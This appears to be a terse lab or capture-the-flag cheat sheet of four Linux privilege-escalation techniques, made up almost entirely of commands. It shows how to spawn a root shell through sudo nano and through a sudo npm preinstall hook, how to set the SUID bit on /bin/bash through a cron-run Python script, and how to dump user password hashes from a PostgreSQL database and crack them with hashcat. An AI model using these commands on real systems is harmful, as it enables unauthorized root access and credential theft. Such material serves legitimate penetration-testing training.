## Vertical Escalation Vector 1

```
sudo -l

sudo nano
^R^X
reset; sh 1>&0 2>&0
bash
```

## Vertical Escalation Vector 2

```
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```

## Vertical Escalation Vector 3

```
vi /opt/tmp.py

#!/usr/bin/env python
import os
import sys
try:
     os.system('chmod +s /bin/bash')
except:
     sys.exit()

# Wait for cron job to run
/bin/bash -ip
```

## Vertical Escalation Vector 4

```
env
psql -h localhost -U "$LAB_DB_USER" -d "$LAB_DB_NAME"
\l
\c labdb
\dt
SELECT * FROM users;

# Get the hash and crack it with hashcat
hashcat -m 3200 pass.hash /usr/share/wordlists/rockyou.txt
```
